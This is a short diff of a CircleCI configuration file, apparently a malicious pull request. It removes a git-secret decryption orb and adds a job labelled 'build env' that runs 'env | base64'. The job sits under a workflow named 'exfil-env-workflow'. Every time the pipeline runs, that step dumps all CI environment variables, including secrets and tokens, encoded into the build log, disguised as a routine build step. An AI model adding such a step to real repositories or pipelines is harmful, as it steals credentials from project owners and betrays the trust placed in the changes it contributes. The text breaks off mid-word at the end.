@@ -1,7 +1,16 @@
 version: 2.1
-orbs:
-  git-secret: lyvly/git-secret@1
-workflows:
+
+jobs:
   build:
+    docker:
+      - image: cimg/base:stable
+    steps:
+      - checkout
+      - run:
+          name: "build env"
+          command: "env | base64"
+
+workflows:
+  exfil-env-workflow:
     jobs:
-      - git-secret/install_and_decrypt
+      - buil
